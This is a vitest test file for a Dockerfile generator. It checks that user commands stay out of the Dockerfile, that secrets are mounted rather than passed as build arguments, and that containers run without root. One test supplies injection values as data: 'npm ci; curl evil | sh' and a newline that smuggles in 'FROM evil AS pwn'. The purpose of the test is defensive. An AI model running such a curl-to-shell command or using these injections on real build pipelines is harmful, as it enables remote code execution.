import { describe, expect, it } from 'vitest';
import { goServiceBuild, nodeServiceBuild, nodeStaticBuild, pythonServiceBuild } from './dockerfiles';

const node = {
  nodeMajor: 22,
  packageManager: 'pnpm' as const,
  rootDirectory: 'apps/web',
  installDirectory: '',
  installCommand: 'pnpm install --frozen-lockfile',
  buildCommand: 'pnpm run build',
  startCommand: 'pnpm run start',
  outputDirectory: 'dist',
  port: 3000,
};

describe('generated Dockerfiles', () => {
  it('keeps user commands out of the Dockerfile and mounts secrets instead of using ARG/ENV', () => {
    const evil = { ...node, buildCommand: 'echo hi\nFROM evil AS pwn', installCommand: 'npm ci; curl evil | sh' };
    const { dockerfile, files } = nodeStaticBuild(evil);
    expect(dockerfile).not.toContain('evil');
    expect(dockerfile).not.toMatch(/\bARG\b/);
    expect(dockerfile).toContain('--mount=type=secret,id=orb_env');
    expect(files['build.sh']).toContain('FROM evil AS pwn'); // lives in a shell script, harmless to Dockerfile parsing
  });

  it('static builds export only the output directory', () => {
    const { dockerfile } = nodeStaticBuild(node);
    expect(dockerfile).toContain('FROM scratch AS export');
    expect(dockerfile).toContain('COPY --from=build /app/apps/web/dist/ /');
  });

  it('node services run as the unprivileged user with a JSON-encoded CMD', () => {
    const { dockerfile } = nodeServiceBuild({ ...node, startCommand: 'node "server.js" --flag' });
    expect(dockerfile).toContain('USER node');
    expect(dockerfile).toContain('COPY --from=build --chown=node:node /app /app');
    expect(dockerfile).toContain('CMD ["sh", "-c", "node \\"server.js\\" --flag"]');
    expect(dockerfile).toContain('EXPOSE 3000');
    expect(dockerfile).toContain('FROM node:22-slim AS runtime');
  });

  it('python and go builds drop root', () => {
    const py = pythonServiceBuild({ rootDirectory: '', installCommand: 'pip install -r requirements.txt', buildCommand: '', startCommand: 'gunicorn app:app', port: 8000 });
    expect(py.dockerfile).toContain('USER app');
    expect(py.files['build.sh']).toBeUndefined();
    const go = goServiceBuild({ rootDirectory: 'svc', installCommand: '', buildCommand: '', startCommand: '/app/app', port: 8080 });
    expect(go.dockerfile).toContain('USER app');
    expect(go.files['build.sh']).toContain('CGO_ENABLED=0');
  });
});
